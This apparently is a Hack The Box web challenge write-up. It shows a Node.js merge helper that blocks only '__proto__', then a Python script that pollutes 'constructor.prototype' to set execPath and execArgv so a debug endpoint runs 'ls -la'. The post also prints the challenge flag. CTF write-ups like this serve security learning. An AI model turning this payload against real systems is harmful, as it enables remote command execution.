---
layout: single
title: Breaking Grad [Web] - Hack The Box
excerpt: "ECSC Prep"
date: 2021-12-21
classes: wide
header:
  teaser: 
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Web Challenge
tags:  
  - Prototype Pollution
---
 

## Vulnerabe Code
### challenge/helpers/ObjectHelper.js


```js

module.exports = {
    isObject(obj) {
        return typeof obj === 'function' || typeof obj === 'object';
    },

    isValidKey(key) {
        return key !== '__proto__';
    },

    merge(target, source) {
        for (let key in source) {
            if (this.isValidKey(key)){
                if (this.isObject(target[key]) && this.isObject(source[key])) {
                    this.merge(target[key], source[key]);
                } else {
                    target[key] = source[key];
                }
            }
        }
        return target;
    },

    clone(target) {
        return this.merge({}, target);
    }
}
```

# Exploit [prototype pollution]
```python
#!/usr/bin/python3
import requests


HOST='http://138.68.136.191:31033'
API='/api/calculate'
ENDPOINT='/debug/version'

#prototype pollution
r=requests.post(HOST+API, json={"constructor":{"prototype":{"execPath":"ls","execArgv":["-la","."]}}}) # send post requests with payload


r1=requests.get(HOST+ENDPOINT) # get results back

print(r1.text)
```
### Flag => HTB{l00s1ng_t3nur3_l1k3_it5_fr1d4y_m0rn1ng}
